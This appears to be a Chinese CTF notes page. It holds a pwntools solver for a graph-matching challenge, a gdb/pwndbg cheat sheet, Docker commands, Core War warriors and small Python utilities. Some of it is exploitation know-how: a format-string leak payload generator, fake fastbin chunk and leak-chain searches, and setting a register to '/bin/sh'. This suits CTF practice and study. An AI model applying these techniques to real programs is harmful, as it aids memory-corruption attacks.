<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="keyword">import</span> networkx.algorithms.matching <span class="keyword">as</span> matching</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_input</span>(<span class="params">data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">list</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    data = [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, x.split())) <span class="keyword">for</span> x <span class="keyword">in</span> data.splitlines()[:-<span class="number">1</span>]]</span><br><span class="line">    [data[i].insert(i, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, [PORT])</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        data = [[<span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">        data = parse_input(p.recvuntilS(<span class="string">b&#x27;&gt; &#x27;</span>))</span><br><span class="line">        G: nx.Graph = nx.Graph([(i, j, &#123;<span class="string">&#x27;weight&#x27;</span>: data[i][j] + data[j][i]&#125;) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[i])) <span class="keyword">if</span> i != j])</span><br><span class="line">        M: <span class="built_in">set</span>[<span class="built_in">tuple</span>] = matching.max_weight_matching(G, maxcardinality=<span class="literal">True</span>)</span><br><span class="line">        M_S: <span class="built_in">list</span>[<span class="built_in">tuple</span>] = <span class="built_in">sorted</span>(<span class="built_in">list</span>(M) + [(b, a) <span class="keyword">for</span> a, b <span class="keyword">in</span> M])</span><br><span class="line">        result: <span class="built_in">str</span> = <span class="string">&#x27;;&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span>,<span class="subst">&#123;b&#125;</span>&#x27;</span> <span class="keyword">for</span> a, b <span class="keyword">in</span> M_S])</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        p.sendline(result.encode())</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="最短权重路径（Djikstra）"><a href="#最短权重路径（Djikstra）" class="headerlink" title="最短权重路径（Djikstra）"></a>最短权重路径（Djikstra）</h1><p><a target="_blank" rel="noopener" href="https://meashiri.github.io/ctf-writeups/posts/202312-tuctf/">https://meashiri.github.io/ctf-writeups/posts/202312-tuctf/</a></p>
<h2 id="gdb使用-pwndbg）"><a href="#gdb使用-pwndbg）" class="headerlink" title="gdb使用(pwndbg）"></a><a target="_blank" rel="noopener" href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">gdb使用</a>(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg</a>）</h2><p>补充：</p>
<ul>
<li><p>stack &lt;num&gt;</p>
<blockquote>
<p>指定查看多少栈内容，直接stack查看的栈帧是不完整的)</p>
</blockquote>
</li>
<li><p>starti &lt;参数&gt;</p>
<blockquote>
<p>无论程序去除符号与否，该命令都能保证在程序的开始断下。可以传入参数。</p>
</blockquote>
</li>
<li><p>info file</p>
<blockquote>
<p>查看文件信息，可用于获取文件加载基址</p>
</blockquote>
</li>
<li><p>x&#x2F;i $pc</p>
<blockquote>
<p>查看当前地址的字节码的反汇编结果</p>
</blockquote>
</li>
<li><p>layout asm</p>
<blockquote>
<p>打开反汇编窗口</p>
</blockquote>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.irya.unam.mx/computo/sites/manuales/fce12/debugger/cl/commandref/gdb_mode/cmd_tbreak.htm">tbreak</a></p>
<blockquote>
<p>在指定位置插入临时断点</p>
</blockquote>
</li>
<li><p>info proc mappings</p>
<blockquote>
<p>查看所有映射，可获取libc加载基址</p>
</blockquote>
</li>
<li><p>x&#x2F;10g $sp</p>
<blockquote>
<p>数字10可以任意更改，表示要查看栈上多少个元素。</p>
</blockquote>
</li>
<li><p>p $ebp-0x4</p>
<blockquote>
<p>打印对应地址的内容，可配合寄存器使用</p>
</blockquote>
</li>
<li><p>find start,end,str</p>
<blockquote>
<p>在start-end的内存中寻找str的地址</p>
</blockquote>
</li>
<li><p>disas [函数名&#x2F;地址]</p>
<blockquote>
<p>反编译置顶位置的指令。如果当前所处位置就是想要反编译的函数，可以直接disas。</p>
</blockquote>
</li>
<li><p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/58851/can-i-set-a-breakpoint-on-memory-access-in-gdb">内存断点</a>：</p>
<ul>
<li><p>watch *addr</p>
<blockquote>
<p>gdb will break when a write occurs</p>
</blockquote>
</li>
<li><p>rwatch *addr</p>
<blockquote>
<p>gdb will break wnen a read occurs</p>
</blockquote>
</li>
<li><p>awatch *addr</p>
<blockquote>
<p>gdb will break in both cases</p>
</blockquote>
</li>
</ul>
</li>
<li><p>set $rip &#x3D; value (set $eip &#x3D; value)</p>
<ul>
<li>设置当前程序的rip&#x2F;eip（64&#x2F;32）</li>
</ul>
</li>
<li><p>jump _start</p>
<blockquote>
<p>重启程序</p>
</blockquote>
</li>
<li><p>find_fake_fast addr size</p>
<blockquote>
<p>在指定addr处寻找size大小的符合fastbin的假堆块（找到可用错位获取合法size的地址）</p>
</blockquote>
</li>
<li><p>info threads</p>
<blockquote>
<p>查看存在的线程</p>
</blockquote>
</li>
<li><p><code>thread &lt;thread_id&gt;</code></p>
<blockquote>
<p>切换到指定id的线程</p>
</blockquote>
</li>
<li><p><code>set *(char **)addr = value</code></p>
<blockquote>
<p>设置addr处的内存（64bit），参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/35370698/how-to-set-an-arbitrary-64-bits-of-memory-in-gdb">https://stackoverflow.com/questions/35370698/how-to-set-an-arbitrary-64-bits-of-memory-in-gdb</a></p>
</blockquote>
<ul>
<li>同理还可以修改汇编指令，找到指令所在的地址处即可。<code>set *(unsigned char*)addr=byte</code>（ <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6473908/can-gdb-change-the-assembly-code-of-a-running-program">https://stackoverflow.com/questions/6473908/can-gdb-change-the-assembly-code-of-a-running-program</a> ）.不过这样改是暂时的，重新run的话就要再patch一次</li>
<li>以及32位下修改addr处的内存（4个字节）：<code>set *(unsigned int*)addr=value</code>。但今天测试后发现直接<code>set *addr=value</code>就行。不过这种方式只能设置32bit</li>
<li>set命令可以直接设置寄存器的内容为某个字符串。如<code>set $rdi=&quot;/bin/sh&quot;</code>。但似乎不能直接将某个地址的内容设为字符串</li>
</ul>
</li>
<li><p><code>gdb -batch -ex &#39;file &lt;program&gt;&#39; -ex &#39;disassemble &lt;func_name&gt;&#39;</code></p>
<ul>
<li>反汇编某个程序的某个函数，参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/22769246/how-to-disassemble-one-single-function-using-objdump">https://stackoverflow.com/questions/22769246/how-to-disassemble-one-single-function-using-objdump</a></li>
</ul>
</li>
<li><p><code>jump &lt;addr&gt;</code></p>
<ul>
<li>跳转到某个地址</li>
</ul>
</li>
<li><p><code>p &amp;name_of_symbol</code></p>
<ul>
<li>获取指定symbol的偏移&#x2F;地址（运行时）</li>
</ul>
</li>
<li><p><code>finish</code></p>
<ul>
<li>Execute until selected stack frame returns</li>
</ul>
</li>
<li><p>可以用gdbserver跨docker container调试。首先在container内运行：</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 2345:2435  ... bash</span><br><span class="line">apt update &amp;&amp; apt install -y gdbserver</span><br><span class="line">gdsbserver 0:2345 ./chal </span><br></pre></td></tr></table></figure>

<p>然后本机运行：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote 0:2345</span><br></pre></td></tr></table></figure>

<ul>
<li><code>define hook-stop</code><ul>
<li>设置程序每次抵达断点处时执行的命令</li>
</ul>
</li>
<li><code>command</code><ul>
<li>用于定义新命令或是给已存在的命令起alias。也可以用来设置程序每次抵达某个断点处时执行的命令</li>
</ul>
</li>
<li><code>set pagination off</code><ul>
<li>当需要展示较多信息时，gdb会分页。该命令用于禁用分页，一次输出全部信息</li>
</ul>
</li>
<li>如何调试fork的子进程： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured">https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured</a></li>
<li>一些pwndbg独有的<a target="_blank" rel="noopener" href="https://browserpwndbg.readthedocs.io/en/docs/">命令</a><ul>
<li><code>distance a b</code><ul>
<li>获取从a到b地址的差值</li>
</ul>
</li>
<li><code>vis_heap_chunks</code><ul>
<li>查看堆块（不同堆块会用不同颜色区分）</li>
</ul>
</li>
<li><code>brva offset</code><ul>
<li>在当前程序的基地址+offset处下断点。要求程序已运行（比如先starti再brva）</li>
</ul>
</li>
<li><code>leakfind</code><ul>
<li>在指定的地址范围内寻找可供泄露的地址链。使用案例：<code>leakfind 0x7ffff7db7000 --max_offset=0x200000 --page_name stack --max_depth=1</code>,尝试在0x7ffff7db7000偏移最大0x200000的区域内找指向stack地址的地址链，链长度最长为1</li>
</ul>
</li>
<li><code>got -p libc</code><ul>
<li>打印libc里的可写got表</li>
</ul>
</li>
<li>配合qemu调试16-bit&#x2F;real mode： <a target="_blank" rel="noopener" href="https://gist.github.com/Theldus/4e1efc07ec13fb84fa10c2f3d054dccd">https://gist.github.com/Theldus/4e1efc07ec13fb84fa10c2f3d054dccd</a> ， <a target="_blank" rel="noopener" href="https://ternet.fr/gdb_real_mode.html">https://ternet.fr/gdb_real_mode.html</a></li>
</ul>
</li>
</ul>
<h2 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h2><ul>
<li><p>docker run –platform linux&#x2F;amd64 -it ubuntu &#x2F;bin&#x2F;bash</p>
<blockquote>
<p>开启amd64位的ubuntu container，如果本地没有相应镜像就会自动拉取并开启。注意已有container后无需使用该命令再次创建一个container。</p>
</blockquote>
</li>
<li><p>docker container start [container name]</p>
<blockquote>
<p>运行一个已创建的container</p>
</blockquote>
</li>
<li><p>docker container ls</p>
<blockquote>
<p>查看已有的container</p>
</blockquote>
</li>
<li><p>docker container attach [CONTAINER ID]</p>
<blockquote>
<p>附加到一个已运行的container（可获取高亮，自动补全，需要先用<code>docker container start</code>启动container）</p>
</blockquote>
</li>
<li><p>docker rename [old name] [new name]</p>
<blockquote>
<p>重命名container</p>
</blockquote>
</li>
<li><p>docker run -i -v “`pwd`:&#x2F;chal” -t xxx@sha256:xxx</p>
<blockquote>
<p>以container形式运行镜像。一般在题目的docker file中能看到<code>xxx@sha256:xxx</code>字样，这就是镜像（image）。-v指定双向挂载，任何在container内部的chal文件夹的文件也会出现在当前目录中（`pwd`命令）。</p>
</blockquote>
</li>
<li><p>从Dockerfile build： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36075525/how-do-i-run-a-docker-instance-from-a-dockerfile">https://stackoverflow.com/questions/36075525/how-do-i-run-a-docker-instance-from-a-dockerfile</a></p>
<ul>
<li>注意Dockerfile命名不要改成其他的，而且要放在当前目录下</li>
<li><code>docker build --tag &#39;name&#39; .</code></li>
<li><code>docker image ls</code>：查看build的image</li>
</ul>
</li>
<li><p>interactive运行docker image： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40854482/interactive-command-in-dockerfile">https://stackoverflow.com/questions/40854482/interactive-command-in-dockerfile</a></p>
<ul>
<li><code>docker run -it &lt;image id&gt; /bin/bash</code></li>
<li>如果是web题需要开放端口： <code>docker run -it --expose &lt;container port&gt; -p &lt;host port&gt;:&lt;container port&gt; &lt;image id&gt;</code>,参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/30109037/how-can-i-forward-localhost-port-on-my-container-to-localhost-on-my-host">https://stackoverflow.com/questions/30109037/how-can-i-forward-localhost-port-on-my-container-to-localhost-on-my-host</a></li>
</ul>
</li>
<li><p>从Container里拷贝文件到本机： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host">https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host</a></p>
<ul>
<li>查看container id&#x2F;name（不要和上面的image id搞混了）：<code>docker container ls</code></li>
<li>libc等文件的路径： <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5925678/location-of-c-standard-library">https://stackoverflow.com/questions/5925678/location-of-c-standard-library</a> 。或者直接用<code>ldd binary</code>获取路径</li>
<li>今天又看见个脚本： <a target="_blank" rel="noopener" href="https://github.com/rerrorctf/ret/blob/main/commands/libc.go">https://github.com/rerrorctf/ret/blob/main/commands/libc.go</a> ，可以直接将container里的libc提取出来</li>
</ul>
</li>
<li><p><code>docker run -it &lt;image id&gt; /bin/bash -v pwd1:pwd2</code></p>
<ul>
<li>与docker container共享目录。本机上的pwd1目录等同于container内部的pwd2目录</li>
</ul>
</li>
</ul>
<h2 id="Qemu-arm-amd64-x86-arm"><a href="#Qemu-arm-amd64-x86-arm" class="headerlink" title="Qemu arm-&gt;amd64&#x2F;x86-&gt;arm"></a>Qemu arm-&gt;amd64&#x2F;x86-&gt;arm</h2><ul>
<li>arm-&gt;amd64<ul>
<li><a target="_blank" rel="noopener" href="https://rw1nd.github.io/2021/04/13/x86-on-arm/">https://rw1nd.github.io/2021/04/13/x86-on-arm/</a></li>
<li><a target="_blank" rel="noopener" href="https://levelup.gitconnected.com/running-amd64-linux-on-apple-m1-with-qemu-utm-64d67cccd6f8">https://levelup.gitconnected.com/running-amd64-linux-on-apple-m1-with-qemu-utm-64d67cccd6f8</a></li>
</ul>
</li>
<li>x86-&gt;arm<ul>
<li><a target="_blank" rel="noopener" href="https://azeria-labs.com/arm-on-x86-qemu-user/">https://azeria-labs.com/arm-on-x86-qemu-user/</a></li>
</ul>
</li>
</ul>
<h2 id="gdb调试脚本"><a href="#gdb调试脚本" class="headerlink" title="gdb调试脚本"></a>gdb调试脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>] <span class="comment">#分屏后ctrl+b o组合键切屏</span></span><br><span class="line">p=process(<span class="string">&quot;gdb&quot;</span>)</span><br><span class="line">sla=<span class="keyword">lambda</span> d,payload:p.sendlineafter(d,payload)</span><br><span class="line">ia=<span class="keyword">lambda</span>:p.interactive()</span><br><span class="line">ra=<span class="keyword">lambda</span> timeout=<span class="number">0.5</span>:p.recvall(timeout=timeout)</span><br><span class="line">rl=<span class="keyword">lambda</span> keep=<span class="literal">False</span>:p.recvline(keepends=keep)</span><br><span class="line">sl=<span class="keyword">lambda</span> payload:p.sendline(payload)</span><br><span class="line">rls=<span class="keyword">lambda</span> line:p.recvlines(line)</span><br><span class="line">ru=<span class="keyword">lambda</span> payload,drop=<span class="literal">True</span>:p.recvuntil(payload,drop)</span><br><span class="line">cl=<span class="keyword">lambda</span>:p.close()</span><br><span class="line">s=<span class="keyword">lambda</span> payload:p.send(payload)</span><br><span class="line">base=<span class="number">0x555555554000</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PIEDebug</span>(<span class="params">file,breakpoints,params=[]</span>):</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">f&quot;file <span class="subst">&#123;file&#125;</span>&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">f&quot;starti <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(params)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> breakpoints:</span><br><span class="line">        sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">f&quot;b *<span class="subst">&#123;base+i&#125;</span>&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_format_string</span>(<span class="params">times,start=<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start,start+times):</span><br><span class="line">        payload+=<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:%<span class="subst">&#123;i&#125;</span>$p&#x27;</span>+end</span><br><span class="line">    <span class="keyword">return</span> payload[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register</span>(<span class="params">reg</span>):</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">&quot;i r&quot;</span>)</span><br><span class="line">    contents=ru(<span class="string">&quot;gs&quot;</span>).split(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> contents:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        temp=i.split()</span><br><span class="line">        register=temp[<span class="number">0</span>]</span><br><span class="line">        value=temp[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> reg.encode() <span class="keyword">in</span> register:</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;none&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_register</span>(<span class="params">register,value</span>):</span><br><span class="line">    sla(<span class="string">&quot;pwndbg&gt;&quot;</span>,<span class="string">f&quot;set $<span class="subst">&#123;register&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="基础波形图绘制脚本"><a href="#基础波形图绘制脚本" class="headerlink" title="基础波形图绘制脚本"></a>基础波形图绘制脚本</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/371394137">参考</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">traces=<span class="built_in">eval</span>(d[<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">t=np.arange(<span class="number">0</span>, <span class="built_in">len</span>(traces))</span><br><span class="line">plt.plot(t, traces)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="linux命令替代"><a href="#linux命令替代" class="headerlink" title="linux命令替代"></a>linux命令替代</h2><ul>
<li><a target="_blank" rel="noopener" href="https://ubunlog.com/en/alternativas-al-comando-ls/">ls</a></li>
<li><a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/86321/how-can-i-display-the-contents-of-a-text-file-on-the-command-line">cat</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#specialer">Specialer</a>:<code>for f in **/*; do echo $(&lt;$f); done</code></li>
</ul>
<h2 id="Core-war"><a href="#Core-war" class="headerlink" title="Core war"></a>Core war</h2><ul>
<li><a target="_blank" rel="noopener" href="https://corewar.co.uk/index.htm">Core War</a></li>
<li><a target="_blank" rel="noopener" href="http://www.koth.org/info.html">koth</a></li>
</ul>
<p>以下warrior都是standard redcode。</p>
<p>一个稳输的自毁warrior：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;redcode</span><br><span class="line">;assert 1</span><br><span class="line">ADD #-1, 3</span><br><span class="line">MOV 2, @2</span><br><span class="line">JMP -2</span><br><span class="line">DAT #0, #0</span><br></pre></td></tr></table></figure>

<p>一个稍微能赢一点的基础warrior(dwarf)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;redcode</span><br><span class="line">;assert 1</span><br><span class="line">start   add.ab  #4, bmb</span><br><span class="line">        mov.i   bmb, @bmb</span><br><span class="line">        jmp     start</span><br><span class="line">bmb     dat     #0, #0</span><br></pre></td></tr></table></figure>

<p>一个胜率较高的warrior：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">;redcode</span><br><span class="line">;assert 1</span><br><span class="line">        org    start</span><br><span class="line"></span><br><span class="line">gate    dat    4000,       1700</span><br><span class="line">bomb    dat    &gt;2667,      11</span><br><span class="line"></span><br><span class="line">        for    4</span><br><span class="line">        dat    0,0</span><br><span class="line">        rof</span><br><span class="line"></span><br><span class="line">        spl    #4000,      &gt;gate</span><br><span class="line">clear   mov    bomb,       &gt;gate</span><br><span class="line">        djn.f  clear,      &gt;gate</span><br><span class="line"></span><br><span class="line">        for    23</span><br><span class="line">        dat    0,0</span><br><span class="line">        rof</span><br><span class="line"></span><br><span class="line">        istep  equ 1143           ; (CORESIZE+1)/7</span><br><span class="line"></span><br><span class="line">start   spl    clear-1</span><br><span class="line">        mov    imp,        *launch</span><br><span class="line">        spl    1                  ; 32 parallel processes</span><br><span class="line">        spl    1</span><br><span class="line">        spl    1</span><br><span class="line">        spl    1</span><br><span class="line">        spl    1</span><br><span class="line">        spl    nxpoint</span><br><span class="line">launch  djn.f  3600,       &lt;4000</span><br><span class="line"></span><br><span class="line">        for    2</span><br><span class="line">        dat    0,0</span><br><span class="line">        rof</span><br><span class="line"></span><br><span class="line">nxpoint add.f  #istep,     launch</span><br><span class="line">        djn.f  clear-1,    &lt;3000</span><br><span class="line"></span><br><span class="line">imp     mov.i  #1,         istep</span><br></pre></td></tr></table></figure>

<h2 id="打印嵌套文件夹内的所有文件内容"><a href="#打印嵌套文件夹内的所有文件内容" class="headerlink" title="打印嵌套文件夹内的所有文件内容"></a>打印嵌套文件夹内的所有文件内容</h2><p><code>find /path/to/folder -type f -exec cat &#123;&#125; \;</code></p>
<h2 id="python画二维码"><a href="#python画二维码" class="headerlink" title="python画二维码"></a>python画二维码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">100</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX, MAX))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;qr.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">m = file.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">		<span class="keyword">if</span>(m[i] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">			pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">		i = i+<span class="number">1</span></span><br><span class="line">pic.save(<span class="string">&quot;res.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = np.zeros((<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;qr.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> f:</span><br><span class="line">        bit = <span class="built_in">int</span>(bit)</span><br><span class="line">        data[idx // <span class="number">100</span>][idx % <span class="number">100</span>] = bit</span><br><span class="line"></span><br><span class="line">        idx = idx + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">plt.imshow(data, interpolation = <span class="string">&quot;nearest&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="python-cv2描绘运动轨迹"><a href="#python-cv2描绘运动轨迹" class="headerlink" title="python cv2描绘运动轨迹"></a>python cv2描绘运动轨迹</h2><p>利用前后帧生成光流，如果该光流往左下走则描绘出来</p>
